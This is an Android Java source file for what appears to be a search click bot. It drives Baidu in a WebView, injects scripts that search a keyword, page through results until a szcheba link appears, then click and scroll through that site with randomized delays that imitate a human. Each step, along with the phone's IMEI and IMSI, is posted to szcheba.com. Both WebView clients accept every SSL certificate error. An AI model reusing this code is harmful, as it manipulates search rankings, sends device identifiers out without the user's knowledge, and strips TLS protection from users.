package com.szcheba.baidutdk;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.http.SslError;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.wsingle.openlibrary.MyDebug;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;

public class MainActivity extends AppCompatActivity {

    public static String TAG = "test";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        MyDebug.Show("端午");
//        searchTDK("又出新车吉利缤瑞", this);
//        searchTDK("全液晶仪表爱信6AT，车标豪车范的7座SUV仅卖7万起！", this);
    }

    int num = 0;
    boolean isCheBa = false;
    Boolean isfinish = null;
    WebView localWebView;
    static String ID = "";


    private void searchTDK(final String keyword, Context paramContext) {
//        localWebView = findViewById(R.id.wv);
        localWebView = new WebView(paramContext);

        String imei = getIMEI(paramContext);
        String imsi = getIMSI(paramContext);
        ID = "IMEI:" + imei + ",IMSI:" + imsi;

        WebSettings localWebSettings = localWebView.getSettings();
        localWebSettings.setJavaScriptEnabled(true);
        localWebSettings.setPluginState(WebSettings.PluginState.ON);
        localWebSettings.setAllowFileAccess(true);
        localWebSettings.setDomStorageEnabled(true);

        localWebView.loadUrl("https://www.baidu.com/");

        localWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.i(TAG, "onPageFinished: " + url);

               /* if (url.contains("baiduid")){
                    return;
                }*/
                if (url.contains("szcheba")) {
                    Log.i(TAG, "onPageFinished: " + "链接包含szcheba");
                    isCheBa = true;
                    if (isfinish == null || isfinish == false) {
                        try {
                            int a = (int) (Math.random() * 5 + 5);
                            Thread.sleep(a * 1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                        if (url.contains("content")) {
                            Log.i(TAG, "链接包含 content");

                            StringBuffer localStringBuffer;
                            localStringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                            localStringBuffer.append("newscript.innerHTML = '");


                            localStringBuffer.append("var timer = setInterval(\\'GoBottom()\\', 10);");
                            localStringBuffer.append("function GoBottom() {");
                            localStringBuffer.append("var currentPosition = document.documentElement.scrollTop || window.pageYOffset || document.body.scrollTop;");
                            localStringBuffer.append("console.log(\\'整体高度：\\' + document.body.scrollHeight  + \\' 当前高度：\\' + currentPosition);");
                            localStringBuffer.append("currentPosition += 1;");
                            localStringBuffer.append("if(currentPosition <= (document.body.scrollHeight - window.screen.availHeight)) {");
                            localStringBuffer.append("console.log(\\'变化后的高度：\\' + currentPosition);");
                            localStringBuffer.append("window.scrollTo(0, currentPosition);");
                            localStringBuffer.append("} else {");
                            //滑动到底部后 清除定时器 跳转下一页
                            localStringBuffer.append("window.scrollTo(0, (document.body.scrollHeight - window.screen.availHeight));");
                            localStringBuffer.append("clearInterval(timer);");

                            localStringBuffer.append("var list_href=document.getElementsByClassName(\\'content_crumn\\')[0].getElementsByTagName(\\'a\\');");
                            localStringBuffer.append("console.log(\\'上下篇：\\'+list_href);");
                            localStringBuffer.append("var href =\\'跳转到下一篇：\\'+ list_href[list_href.length-1].getAttribute(\\'href\\');");
                            localStringBuffer.append(sendLog("href"));
                            localStringBuffer.append("list_href[list_href.length-1].click();");

                            localStringBuffer.append("}}");

                            localStringBuffer.append("';");
                            localStringBuffer.append("document.body.appendChild(newscript);");
                            view.loadUrl("javascript:" + localStringBuffer.toString());
                        }
                    }
                } else if (!url.contains("baiduid=")) {
                    if (num == 0) {
                        StringBuffer localStringBuffer;
                        localStringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                        localStringBuffer.append("newscript.innerHTML = '");

                        localStringBuffer.append("var keywords = \\'").append("搜索关键字：" + keyword).append("\\';");
                        localStringBuffer.append(sendLog("keywords"));

                        localStringBuffer.append("var kw = document.getElementById(\\'index-kw\\');");
                        localStringBuffer.append("kw.value = \\'").append(keyword).append("\\';");
                        localStringBuffer.append("document.getElementById(\\'index-bn\\').click();");
                        localStringBuffer.append("';");
                        localStringBuffer.append("document.body.appendChild(newscript);");
                        view.loadUrl("javascript:" + localStringBuffer.toString());

                    } else if (num < 20 && !isCheBa) {
                        StringBuffer localStringBuffer;
                        localStringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                        localStringBuffer.append("newscript.innerHTML = '");

                        localStringBuffer.append("var num = \\'").append("搜索翻页第 " + num + " 页").append("\\';");
                        localStringBuffer.append(sendLog("num"));

                        localStringBuffer.append("var isscr=true;");
                        localStringBuffer.append("var result = document.getElementById(\\'results\\').getElementsByClassName(\\'result\\');");
                        localStringBuffer.append("for (var i = 0; i < result.length; i++) {");
                        localStringBuffer.append("var showurls=result[i].getElementsByClassName(\\'c-showurl\\');");
                        localStringBuffer.append("if(showurls.length>2){");
                        localStringBuffer.append("if(showurls[1].innerHTML.indexOf(\\'szcheba\\')!=-1){");
                        localStringBuffer.append("isscr=false;");
//                    localStringBuffer.append("window.location.href=showurls[0].getElementsByTagName(\\'a\\')[0].getAttribute(\\'href\\');");
                        localStringBuffer.append("var href =\\'跳转到详情界面链接：\\'+ showurls[0].getElementsByTagName(\\'a\\')[0].getAttribute(\\'href\\');");
                        localStringBuffer.append(sendLog("href"));

                        localStringBuffer.append("showurls[0].getElementsByTagName(\\'a\\')[0].click();");
                        localStringBuffer.append("}");
                        localStringBuffer.append("}");
                        localStringBuffer.append("}");

                        localStringBuffer.append("if(isscr){");
                        localStringBuffer.append("if(document.getElementById(\\'page-controller\\').getElementsByClassName(\\'new-pagenav\\')[0].getElementsByTagName(\\'div\\').length>2){");
                        localStringBuffer.append("var next = document.getElementById(\\'page-controller\\').getElementsByClassName(\\'new-pagenav-right\\')[0].getElementsByTagName(\\'a\\')[0];");
                        localStringBuffer.append("window.location.href=next.getAttribute(\\'href\\');");
                        localStringBuffer.append("}else{");
                        localStringBuffer.append("var next = document.getElementById(\\'page-controller\\').getElementsByClassName(\\'new-pagenav\\')[0].getElementsByTagName(\\'a\\')[0];");
                        localStringBuffer.append("window.location.href=next.getAttribute(\\'href\\');");
                        localStringBuffer.append("}");
                        localStringBuffer.append("}");

                        localStringBuffer.append("';");

                        localStringBuffer.append("document.body.appendChild(newscript);");
                        view.loadUrl("javascript:" + localStringBuffer.toString());

                        Log.i(TAG, "搜索翻页第" + num + "页");
                    }

                    num += 1;
                }
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed(); // 接受所有网站的证书
                super.onReceivedSslError(view, handler, error);
            }
        });
    }


    private void searchTDK_Old(final String keyword, Context paramContext) {
        localWebView = findViewById(R.id.wv);
//        localWebView = new WebView(paramContext);

        String imei = getIMEI(paramContext);
        String imsi = getIMSI(paramContext);
        ID = "IMEI:" + imei + ",IMSI:" + imsi;

        WebSettings localWebSettings = localWebView.getSettings();
        localWebSettings.setJavaScriptEnabled(true);
        localWebSettings.setPluginState(WebSettings.PluginState.ON);
        localWebSettings.setAllowFileAccess(true);
        localWebSettings.setDomStorageEnabled(true);

        localWebView.loadUrl("https://www.baidu.com/");

        localWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.i(TAG, "onPageFinished: " + url);

               /* if (url.contains("baiduid")){
                    return;
                }*/
                if (url.contains("szcheba")) {
                    Log.i(TAG, "onPageFinished: " + "链接包含szcheba");
                    isCheBa = true;
                    if (isfinish == null || isfinish == false) {
                        try {
                            int a = (int) (Math.random() * 5 + 5);
                            Thread.sleep(a * 1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                        if (url.contains("content")) {
                            Log.i(TAG, "链接包含 content");
                            StringBuffer localStringBuffer;
                            localStringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                            localStringBuffer.append("newscript.innerHTML = '");

                            localStringBuffer.append("var href =\\'跳转到首页链接：\\'+ window.location.origin+document.getElementsByClassName(\\'title\\')[0].getElementsByTagName(\\'a\\')[0].getAttribute(\\'href\\');");
                            localStringBuffer.append(sendLog("href"));
                            localStringBuffer.append("document.getElementsByClassName(\\'title\\')[0].getElementsByTagName(\\'a\\')[0].click();");

                            localStringBuffer.append("';");
                            localStringBuffer.append("document.body.appendChild(newscript);");
                            view.loadUrl("javascript:" + localStringBuffer.toString());

                        } else {
                            if (isfinish == null) {
                                isfinish = false;
                                Log.i(TAG, "主页随机选择栏目");
                                StringBuffer localStringBuffer;
                                localStringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                                localStringBuffer.append("newscript.innerHTML = '");

                                localStringBuffer.append("var listA=document.getElementsByClassName(\\'nav2\\')[0].getElementsByTagName(\\'a\\');");
                                localStringBuffer.append("var listB=document.getElementsByClassName(\\'nav1\\')[0].getElementsByTagName(\\'a\\');");
                                localStringBuffer.append("var rand = Math.floor(Math.random()*(listA.length));");
                                localStringBuffer.append("console.log(\\'第一次生成随机值：\\'+rand);");
                                localStringBuffer.append("if(rand%2 ==0){");
                                localStringBuffer.append("var randA = Math.floor(Math.random()*(listA.length));");
                                localStringBuffer.append("console.log(\\'randA生成随机值：\\'+randA);");
                                localStringBuffer.append("var href =\\'主页随机选择栏目：\\'+ window.location.origin + listA[randA].getAttribute(\\'href\\');");
                                localStringBuffer.append(sendLog("href"));
                                localStringBuffer.append("listA[randA].click();");
                                localStringBuffer.append("}else{");
                                localStringBuffer.append("var randB = Math.floor(Math.random()*(listB.length));");
                                localStringBuffer.append("randB == 4 ? randB+1 : randB;");
                                localStringBuffer.append("console.log(\\'randB生成随机值：\\'+randB);");
                                localStringBuffer.append("var href =\\'主页随机选择栏目：\\'+ window.location.origin + listB[randB].getAttribute(\\'href\\');");
                                localStringBuffer.append(sendLog("href"));
                                localStringBuffer.append("listB[randB].click();");
                                localStringBuffer.append("}");


                                localStringBuffer.append("';");
                                localStringBuffer.append("document.body.appendChild(newscript);");
                                view.loadUrl("javascript:" + localStringBuffer.toString());
                            } else {
                                isfinish = true;
                                Log.i(TAG, "第二次跳转到详情界面");
                                StringBuffer localStringBuffer;
                                localStringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                                localStringBuffer.append("newscript.innerHTML = '");

                                localStringBuffer.append("var ul=document.getElementsByTagName(\\'ul\\');");
                                localStringBuffer.append("console.log(\\'列表ul：\\'+ul);");
                                localStringBuffer.append("if(ul.length!=0){");
                                localStringBuffer.append("var items = ul[0].getElementsByTagName(\\'li\\');");
                                localStringBuffer.append("console.log(\\'列表items：\\'+items);");
                                localStringBuffer.append("var itemnum = Math.floor(Math.random()*items.length);");
                                localStringBuffer.append("console.log(\\'itemnum：\\'+itemnum);");
                                localStringBuffer.append("var href =\\'第二次跳转到详情界面：\\'+ window.location.origin + items[itemnum].getElementsByTagName(\\'a\\')[0].getAttribute(\\'href\\');");
                                localStringBuffer.append(sendLog("href"));

                                localStringBuffer.append("console.log(\\'href：\\'+href);");
                                localStringBuffer.append("items[itemnum].getElementsByTagName(\\'a\\')[0].click();");
                                localStringBuffer.append("}");

                                localStringBuffer.append("';");
                                localStringBuffer.append("document.body.appendChild(newscript);");
                                view.loadUrl("javascript:" + localStringBuffer.toString());
                            }

                        }
                    }
                } else if (!url.contains("baiduid=")) {
                    if (num == 0) {
                        StringBuffer localStringBuffer;
                        localStringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                        localStringBuffer.append("newscript.innerHTML = '");

                        localStringBuffer.append("var keywords = \\'").append("搜索关键字：" + keyword).append("\\';");
                        localStringBuffer.append(sendLog("keywords"));

                        localStringBuffer.append("var kw = document.getElementById(\\'index-kw\\');");
                        localStringBuffer.append("kw.value = \\'").append(keyword).append("\\';");
                        localStringBuffer.append("document.getElementById(\\'index-bn\\').click();");
                        localStringBuffer.append("';");
                        localStringBuffer.append("document.body.appendChild(newscript);");
                        view.loadUrl("javascript:" + localStringBuffer.toString());

                    } else if (num < 20 && !isCheBa) {
                        StringBuffer localStringBuffer;
                        localStringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                        localStringBuffer.append("newscript.innerHTML = '");

                        localStringBuffer.append("var num = \\'").append("搜索翻页第 " + num + " 页").append("\\';");
                        localStringBuffer.append(sendLog("num"));

                        localStringBuffer.append("var isscr=true;");
                        localStringBuffer.append("var result = document.getElementById(\\'results\\').getElementsByClassName(\\'result\\');");
                        localStringBuffer.append("for (var i = 0; i < result.length; i++) {");
                        localStringBuffer.append("var showurls=result[i].getElementsByClassName(\\'c-showurl\\');");
                        localStringBuffer.append("if(showurls.length>2){");
                        localStringBuffer.append("if(showurls[1].innerHTML.indexOf(\\'szcheba\\')!=-1){");
                        localStringBuffer.append("isscr=false;");
//                    localStringBuffer.append("window.location.href=showurls[0].getElementsByTagName(\\'a\\')[0].getAttribute(\\'href\\');");
                        localStringBuffer.append("var href =\\'跳转到详情界面链接：\\'+ showurls[0].getElementsByTagName(\\'a\\')[0].getAttribute(\\'href\\');");
                        localStringBuffer.append(sendLog("href"));

                        localStringBuffer.append("showurls[0].getElementsByTagName(\\'a\\')[0].click();");
                        localStringBuffer.append("}");
                        localStringBuffer.append("}");
                        localStringBuffer.append("}");

                        localStringBuffer.append("if(isscr){");
                        localStringBuffer.append("if(document.getElementById(\\'page-controller\\').getElementsByClassName(\\'new-pagenav\\')[0].getElementsByTagName(\\'div\\').length>2){");
                        localStringBuffer.append("var next = document.getElementById(\\'page-controller\\').getElementsByClassName(\\'new-pagenav-right\\')[0].getElementsByTagName(\\'a\\')[0];");
                        localStringBuffer.append("window.location.href=next.getAttribute(\\'href\\');");
                        localStringBuffer.append("}else{");
                        localStringBuffer.append("var next = document.getElementById(\\'page-controller\\').getElementsByClassName(\\'new-pagenav\\')[0].getElementsByTagName(\\'a\\')[0];");
                        localStringBuffer.append("window.location.href=next.getAttribute(\\'href\\');");
                        localStringBuffer.append("}");
                        localStringBuffer.append("}");

                        localStringBuffer.append("';");

                        localStringBuffer.append("document.body.appendChild(newscript);");
                        view.loadUrl("javascript:" + localStringBuffer.toString());

                        Log.i(TAG, "搜索翻页第" + num + "页");
                    }
                    num += 1;
                }
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed(); // 接受所有网站的证书
                super.onReceivedSslError(view, handler, error);
            }
        });
    }

    /**
     * 获取手机IMEI
     */
    public static final String getIMEI(Context context) {
        try {
            //实例化TelephonyManager对象
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            //获取IMEI号
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                return "";
            }
            String imei = telephonyManager.getDeviceId();
            //在次做个验证，也不是什么时候都能获取到的啊
            if (imei == null) {
                imei = "";
            }
            return imei;
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }

    }

    /**
     * 获取手机IMSI
     */
    public static String getIMSI(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            //获取IMSI号
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                return "";
            }
            String imsi = telephonyManager.getSubscriberId();
            if (null == imsi) {
                imsi = "";
            }
            return imsi;
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    public static StringBuffer sendLog(String s) {
        StringBuffer localStringBuffer;
        localStringBuffer = new StringBuffer("var xmlhttp=new XMLHttpRequest();");
        localStringBuffer.append("xmlhttp.open(\\'POST\\',\\'https://www.szcheba.com/Interface/acccb.jsp\\',true);");
        localStringBuffer.append("xmlhttp.setRequestHeader(\\'Content-type\\',\\'application/x-www-form-urlencoded\\');");
        localStringBuffer.append("xmlhttp.send(\\'req=\\'+\\'").append(ID).append(",\\'+").append(s).append(");");
        return localStringBuffer;
    }

}
